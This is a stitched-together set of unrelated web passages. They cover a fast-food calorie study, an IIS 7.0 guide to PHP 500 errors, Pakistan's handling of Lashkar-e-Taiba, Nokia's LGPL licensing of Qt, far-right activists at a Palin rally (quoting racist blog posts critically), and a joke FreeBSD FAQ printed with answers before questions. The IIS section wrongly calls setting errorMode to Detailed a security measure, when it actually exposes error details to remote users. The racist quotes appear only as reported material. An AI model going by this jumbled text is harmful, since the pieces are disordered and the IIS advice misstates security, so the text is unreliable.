But he also found that fast food meals were smaller , and thus the usual fast food meal featured fewer calories than an average meal from a restaurant , whether the customer is a child , youngster or adult .
However , fast food diners eat more often during a day than restaurants diners , which results in more calories consumed .
After having a meal at a table service restaurant , diners reduce their food consumption for the rest of the day .
Scientists consider that this is due to the difference in energy density .
One of the most interesting finds in the study was that fast food meals had the biggest effects for adults .
The other surprising result was that children accumulated more calories when eating at restaurants .
" It is misleading to focus concerns about the nutritional effects of increased food away from home primarily on fast food .
All food away from home should be considered , " outlined Binkley .
Recently we had to work on a Windows server 2008 ( web edition ) machine with IIS 7.0 and we ran into the strangest of errors .
The server stops running the script with this message :
Server Error
500 – Internal server error .
There is a problem with the resource you are looking for , and it can not be displayed .
Cause :
This error happens on the default configuration of windows server 2008 .
The server logs do not say a lot except for the fact that the php file is causing an error .
This happens for the following reasons on the server :
PHP Fatal error ( Something that you did or did n’t do caused the server to run into a fatal error )
PHP error_reporting is on and there are some errors ( Anything from a NOTICE or WARNING can cause this )
How to rectify :
Obviously the best way to resolve the error is find out what is wrong with the PHP code .
But how do you do this if the server wo n’t show you what the error is ?
One of the best ways to find what is wrong with your PHP script is to try to login to the machine via RDP .
This works only if you have remote desktop access .
Once in RDP try to go to the same URL but using the server ’s Internet explorer .
Accessing the server locally will avoid the 500 Internal Server Error and show you what is wrong with the PHP file as on a development environment .
The server just shows you the PHP error messages and the rest of your script output is not shown .
Change IIS 7.0 Setting
Alternatively to the above , you can always change the configuration using the Configuration Editor of IIS 7.0 .
You will find this under the Section > system.webServer/httpErrors .
You have to change errorMode to Detailed from the usual DetailedLocalOnly and then click on Apply .
This is a good security measure as it will not accidentally show your PHP errors to the users of your system .
NASA is sending a prototype of its new lunar rover to appear in the Presidential Inauguration Parade in Washington , D.C.
The six - wheeled Small Pressurized Rover , or SPR , will provide the big , geeky finish to the line of floats and marching bands scheduled to head down Pennsylvania Avenue on Jan. 20 .
The hope is that the new Obama Administration will support NASA ’s current plan to return to the moon , on or around 2020 .

Thomas Ricks has a new book out on Iraq .
Here 's part of an interview with Ricks :
I actually think 2009 in Iraq is gonna be a lot tougher than 2008 , for three reasons :
-- Elections in Iraq tend to be destabilizing , and there are three scheduled for this year , with national elections at the end of the year .
-- At the same time , large numbers of American troops , who have been keeping a lid on things , probably will be withdrawn .
General Odierno says at the end of the book that he thinks things will get dicey at the end of his year and the beginning of next year , when we start pulling out of less secure areas , having already left the more secure ones .
-- Finally , NONE of the basic questions facing Iraq have been resolved .
Oil revenue is just the most prominent .
As Odierno says in the book , the surge created a breathing space , and some Iraqi leaders used that space to move backward .

IF PAKISTAN'S leaders had ever united against Islamist militancy as they have against India over the past three weeks , their country would not be the violent mess that it is .
Ever since India alleged , with subsequent corroboration from America and Britain , that Pakistani terrorists carried out last month 's mass murder in Mumbai , the country 's politicians , generals and fire - breathing journalists have been declaring themselves ready for war — if that 's what India chooses .
India 's government , despite huge pressure from its own bellicose media , has been more restrained .
It has said it does not intend to attack its neighbour .
But it has demanded that Pakistan dismantle an anti-Indian militant group , Lashkar - e - Taiba ( LET ) , that has carried out numerous atrocities in India , apparently including the outrage on Mumbai .
It has so far relied on diplomacy , particularly through America and Britain , to make this point .
But India is frustrated .
Pakistan has taken some steps against Jamaat - ud - Dawa ( JUD ) , an Islamist charity that is a front for LET , which was formally banned by Pakistan , under American pressure , in 2002 .
But it is not clear at this stage how far they go .
On December 11th , a day after the UN Security Council banned JUD , Pakistan said it had also banned it .
It has since arrested the group 's leaders , including Hafiz Saeed , a professor of engineering , who founded LET and JUD in the 1980s .
It has also arrested many JUD activists , sealed scores of the charity 's offices and stopped publication of at least six JUD newspapers .
Initially , it also said it would take over the group 's many hospitals and schools — allegedly including over 170 schools in Punjab province alone .
But it has since seemed to backtrack on this .
According to one minister , the government will set up a new charity to run these services .
According to a senior official in Punjab , some of JUD 's facilities may be left in the same Islamist hands .
They may include a vast jihadist citadel that JUD operates in Muridke , a town close to the Indian border ( its entrance is shown in our picture ) .
It contains two schools , for 1,000 children , an Islamic college and a hospital that sees 100 outpatients a day .
The campus 's manager , a courteous Islamist called Abu Ehsan , said 66 local villages depend on the services it provides , and he trusted that the government would not disrupt them .
Shortly after JUD was banned , local police turned up on the campus .
But they soon left and Mr Ehsan said he had heard no more from them .
So , for now at least , the schools at Muridke remain free to teach what Mr Saeed has preached for two decades : jihad against Hindu India , especially to drive it from the contested region of Kashmir .
It was for this purpose that LET was founded , with support from the army 's Inter - Services Intelligence agency ( ISI ) .
For two decades , as the army 's proxy , it has waged an insurgency in Indian - held Kashmir that has cost over 40,000 lives .
Though the ISI appears to have cut back its ties to LET since it was banned , its armouries and military training camps in Pakistan - held Kashmir have remained in place .
The bearded and purposeful men who patrol the campus in Muridke with pyjama trousers hitched halfway up their shins might be graduates of these camps .
They have an imposing bearing not usually acquired during teacher training .
On the campus , a 12 - year - old boarding student , Hamza Nazir , says he likes his school , “ because we get Islamic education and we learn how to deal with our enemies . ”
Asked to elucidate , he offers an Urdu proverb : “ A hint 's enough for a wise man . ”
Foolishly , then , many Pakistanis , including some of the country 's most senior officials , are claiming that JUD is being victimised .
“ No JUD office is recruiting people for jihad , ” says one of those responsible for closing the group down .
Many also say they fear a violent backlash .
Others fret that it will be difficult to make a case against JUD 's detained leaders , even if India supplies Pakistan with the evidence of their responsibility for the Mumbai attacks that it claims to have .
These are legitimate worries .
Yet , especially to Indian ears , they are starting to sound like familiar excuses .
In the current spirit of nationalism , it is hard to avoid an impression that many Pakistanis are relieved to be unified against the one enemy they can all agree on , India .
By contrast , many remain deeply sceptical about their need to tackle terrorism and a Taliban insurgency at home , despite over 50 suicide bomb blasts in Pakistan last year .
To explain these conflicts — though it is a stretch — it has become increasingly fashionable in Pakistan to blame them on India .
The army seems convinced that India is supporting the Taliban .
This makes Pakistanis especially loth to crack down on LET , historically at least their trustiest weapon against India .
This is worrying .
So far , Pakistan should consider itself fortunate to have received such gentle handling after Mumbai .
In the event of another catastrophic attack , India might be less cautious .
Even as it is , great damage has been done .
Pakistan really cannot afford anything less than peace with its neighbour .
Facing a long war on its north - western border , it cannot keep up its decades - old readiness on the eastern one .
Moreover for its moribund economy to grow , it needs urgently to improve trade and investment relations with India .
Asif Ali Zardari , Pakistan 's commercially minded president , seemed to recognise this .
He had been trying to coax life back into the once successful but now stagnant diplomatic effort to normalise relations between the two countries .
But on December 14th India 's prime minister , Manmohan Singh , suggested that so long as Pakistan 's vicious sometime proxies remain unchecked , this will be impossible .

Nokia has announced plans to make the open source Qt toolkit available under GNU 's Lesser General Public License ( LGPL ) , alongside the existing GPL and commercial licensing options .
This change could significantly boost
Qt adoption , redefine the economics of cross- platform programming , and dramatically reshape the landscape of commercial application development on the Linux desktop .
Qt is a popular cross-platform software development framework and widget toolkit that supports Windows , Linux , Mac OS X , and several mobile operating systems .
It provides the underlying foundation of the open source KDE desktop environment and is also widely used by commercial software vendors .
It was originally created in the early 90s by a Norwegian company called Trolltech , which was acquired last year by Nokia for $ 153 million .
Nokia 's acquisition of Trolltech raised questions about the future of Qt and led to widespread speculation about the possibility of licensing changes for the toolkit .
Qt has traditionally been distributed under a dual - licensing model , with source code available under a reciprocal license for open source software developers and under a commercial license for proprietary software developers .
Reciprocal open source licenses , which are also called " copyleft " licenses , stipulate that all derivatives must be distributed under the same terms .
Making
Qt available under a reciprocal license made it possible for the toolkit to be widely adopted by open source application developers , but any developer who wanted to use it for a proprietary application had to pay Trolltech for a commercial license .
The commercial licenses are sold on a per-developer , per-platform basis , which adds up quickly and creates a very costly barrier to entry for independent developers .
This is the only factor that has limited Qt adoption .
Many companies in the open source ecosystem have chosen to back the competing GTK + toolkit instead , which is available under the permissive LGPL license .
Although GTK + has n't improved as swiftly as Qt and still trails behind on advanced features such as input redirection and theming , GTK + has continued to evolve and remain relevant because many companies that do n't want to contend with Qt 's commercial licensing have invested in GTK + development .
Changing the game
Nokia 's decision to adopt the LGPL for Qt will eliminate the cost barrier , making it possible for developers to freely use Qt for proprietary application development .
This in turn will significantly expand the number of developers who are using the toolkit and will also attract involvement from companies that find the permissiveness of the LGPL appealing .
The impact of these changes could be enormous .
Qt is a powerful toolkit with a lot of rich functionality .
Applications written in Qt are fully cross-platform and need only be recompiled to run on any supported platform .
Qt has a sophisticated theming system that allows it to use native widgets and adhere to native platform conventions without requiring significant platform - specific modifications to code .
This means that it can deliver a level of visual and functional platform integration that is superior to most other cross-platform toolkits .
Cross - platform development is becoming increasingly important as desktop alternatives to the Windows juggernaut have become more attractive and popular .
The cost of building native cross-platform applications has , however , has traditionally been prohibitively expensive because it has generally meant maintaining multiple , parallel code bases .
The ability to use Qt at no cost for proprietary commercial development completely changes the economics of cross- platform development and will finally make it an easy and affordable option .
This could boost the amount of software that is available for Linux and Mac OS X .
Qt is already used by several prominent cross-platform proprietary applications , including Google Earth , Skype , Opera , and Adobe Photoshop Album .
It 's easy to imagine the companies behind that software adopting
Qt more pervasively in the future and it will also likely be used by other companies that are looking to get a lucrative chunk of the alternative platform pie .
An inclusive and transparent development model
In addition to adopting the LGPL license for Qt , Nokia will also be completely changing Qt 's development model to make it more inclusive and transparent .
The source code will be moved to a publicly - accessible Git repository so that the latest changes will always be visible .
The use of Git , a distributed version control system , will make it easier for third - party developers to participate directly in the process of improving Qt .
To further reduce the barrier to participation , Nokia plans to accept code from contributors without requiring copyright assignment .
Permissive licensing and a more community - oriented development model could give Qt sufficient appeal to reduce the dominance of GTK + as a toolkit for Linux application development .
GTK + is currently in a bit of a weak position and needs a major boost to achieve technical parity .
Many of the historical weaknesses of GTK + and its most significant deficiencies relative to Qt would probably be addressed in the upcoming GTK +
3 update , but now that Qt is available under a sufficiently permissive license , some companies are going to ask whether it still makes sense to make investments in using and advancing GTK +.
This could eventually deflate some ISV support for the GNOME ecosystem and lead to a shift towards Qt and KDE on the Linux desktop .
That wo n't happen right away , however , and even Nokia intends to continue using GTK + in certain contexts .
Nokia tells us that GTK + will continue to be the primary toolkit for the next - generation Maemo platform .
We talked to Sebastian Nyström , Nokia 's VP of Qt , who explained that the licensing change was primarily driven by a desire to boost the quality of Qt .
The company will be using it internally for a wide range of things and is positioning it as a modern solution for building applications for its own Symbian platform .
Nokia concluded that , in the long term , the benefits of adopting a participatory development model and accelerating development far outweighed the value of the revenue stream that it could generate by selling commercial licenses .
The commercial licenses will still be available , however , for developers who do n't wish to be constrained by the terms of the LGPL .
Nyström says that Nokia intends to take Qt " to the next level " by getting the community involved in improving the toolkit 's performance , functionality , and platform support .
Nokia will also be hiring additional full - time developers to work on the toolkit .
The licensing change is clearly a win for Nokia , application developers , and a large segment of the open source software community .
Santelli's Tea Party moment
CNBC 's Rick Santelli and the traders on the floor of the CME Group express outrage over the notion they may have to pay their neighbor 's mortgage , particularly if they bought far more house than they could actually afford , with Jason Roney , Sharmac Capital .
On Wednesday , I reported for The Daily Beast that key leaders of the white supremacist movement are seeking new opportunities to infiltrate and influence the political mainstream , particularly within the Republican base .
An exclusive new video , shown here for the first time , offers new evidence of their strategic push .
In the video , shot by an amateur videographer who provided me exclusive access to his footage , an unidentified staffer from one of the country ’s most popular white supremacist radio programs , The Political Cesspool , is seen promoting his show ’s website at an October 13 rally for Sarah Palin in Virginia Beach , Virginia .
Just feet away , Randall Terry , founder of the anti-abortion group Operation Rescue , hands out fliers and recruits volunteers to canvas for McCain - Palin .
Though neither Political Cesspool nor Randall Terry have any known contact with the McCain - Palin campaign , their presence at the recent Palin rally presents one of the clearest portraits yet of the far right ’s attempts to exploit the Republican base ’s anti-Obama resentment for organizational gain .
According to its " Statement of Principles , " the Political Cesspool " represent[s ] a philosophy that is pro-White " and which " heartily endorse[s ] and accept[s ] as our own , the founding tenets of the Council of Conservative Citizens [ CCC ] , " America ’s largest white supremacist group .
A 2007 article in the Southern Poverty Law Center 's Intelligence Report noted that , “ The Political Cesspool ' in the past two years has become the primary radio nexus of hate in America . ”
The writings of Political Cesspool ’s founder , James Edwards , offer bold evidence of the racist ideology behind his show .
Here are a few revealing examples from Edwards ’ blog , courtesy of Media Matters for America :
In an August 11 post , Edwards wrote : " For blacks in the Americas , slavery is the greatest thing that ever happened to them .
Unfortunately , it 's the worst thing that ever happened to white Americans . "
In an August 6 post headlined " Jewish media reaches new heights , " discussing a Slate.com article by " Jew Timothy Noah , " Edwards wrote that the piece would " make sense once you understand that Jews are the ones who are always speaking in code ; when they use words like ' racists ' , ' bigots ' , ' anti- semites ' , they simply mean white people . "
Similarly , in a July 9 post headlined " Great moments in Jewish journalism , " Edwards referred to a column by The Washington Post 's David S. Broder about former Sen.
Jesse Helms as " another hatefilled Jewish attack piece . "
In a July 30 post , Edwards asked : " If the WNBA [ Women 's National Basketball Association ] is so hell bent on diversity , why do n't they hire a couple of heterosexual players or coaches ? "
In a June 6 post headlined " Does she hate Whitey ? "
Edwards wrote : " Michelle Obama , that is .
Uh , yeah , I 'm pretty sure she does .
Just like her husband .
Just like about 90 % of blacks . "
In the footage , Randall Terry is seen nearby shouting into a megaphone , “ We must do whatever it takes to stop Obama ! ” A Terry associate wearing a Palin t- shirt hands out fliers urging anti-abortion advocates to organize against Obama ’s election .
While the Political Cesspool organizer expresses no support for McCain - Palin , and seems reluctant to divulge his show ’s racist politics , Terry seems openly supportive of the McCain - Palin campaign .
Who is Terry ?
During the 1990’s , Terry ’s radical anti-abortion outfit , Operation Rescue , organized blockades outside women ’s health clinics across the country .
These blockades often turned violent , and some of Terry ’s closest cadres resorted to domestic terrorism .
Case in point :
In 1998 , while cooking dinner for his wife and four children , Barnett Slepian — an abortion doctor whose home had been the site of protests by Terry and his followers years before — was shot to death through his kitchen window by James Kopp , a former volunteer at Operation Rescue 's Binghamton , N.Y. , office .
Below the media ’s radar , the far , far right is exploiting Barack Obama for political gain .
Terry is as avid proponent of Christian Reconstructionism , a radical ideology that calls for replacing the US Constitution with Biblical law .
“ I want you to just let a wave of intolerance wash over you ...
I want you to let a wave of hatred wash over you .
Yes , hate is good , ” Terry told his followers in August 1993 .
He went on : “ Our goal is a Christian nation .
We have a biblical duty , we are called by God , to conquer this country .
We do n't want equal time .
We do n't want pluralism . "
Arrested over 40 times , including once for mailing an aborted fetus to Bill Clinton at the 1992 Democratic National Convention , beleaguered by lawsuits , and reeling from a messy divorce that badly harmed his movement credibility , Terry is seeking a path back to movement prominence .
Terry ’s politics might differ from the overtly racist overtures of Political Cesspool , but he shares similar strategies .
Below the media ’s radar , the far , far right is exploiting Barack Obama for political gain .
Seriously , FreeBSD uses the HLT ( halt ) instruction when the system is idle thus lowering its energy consumption and therefore the heat it generates .
Also if you have ACPI ( Advanced Configuration and Power Interface ) configured , then FreeBSD can also put the CPU into a low power mode .
A . No , but we have done numerous taste tests on blindfolded volunteers who have also had 250 micrograms of LSD - 25 administered beforehand .
35 % of the volunteers said that FreeBSD tasted sort of orange , whereas Linux® tasted like purple haze .
Neither group mentioned any significant variances in temperature .
We eventually had to throw the results of this survey out entirely anyway when we found that too many volunteers were wandering out of the room during the tests , thus skewing the results .
We think most of the volunteers are at Apple now , working on their new “ scratch and sniff ” GUI .
It is a funny old business we are in !
Q. Has anyone done any temperature testing while running FreeBSD ?
I know Linux® runs cooler than DOS , but have never seen a mention of FreeBSD .
It seems to run really hot .
Who is scratching in my memory banks ??
If the noise gets to you , a good fdisk / mbr from DOS will get rid of them , but do not be surprised if they react adversely and try to stop you .
In fact , if at any point during the exercise you hear the satanic voice of Bill Gates coming from the built - in speaker , take off running and do not ever look back !
Freed from the counterbalancing influence of the BSD daemons , the twin demons of DOS and Windows ® are often able to re-assert total control over your machine to the eternal damnation of your soul .
Now that you know , given a choice you would probably prefer to get used to the scratchy noises , no ?
A. Yes !
You will see frequent references to “ daemons ” in the BSD documentation , and what most people do not know is that this refers to genuine , non-corporeal entities that now possess your computer .
The scratchy sound coming from your memory is actually high - pitched whispering exchanged among the daemons as they best decide how to deal with various system administration tasks .
Q. Is there anything “ odd ” that FreeBSD does when compiling the kernel which would cause the memory to make a scratchy sound ?
When compiling ( and for a brief moment after recognizing the floppy drive upon startup , as well ) , a strange scratchy sound emanates from what appears to be the memory banks .
How many FreeBSD hackers does it take to change a lightbulb ?
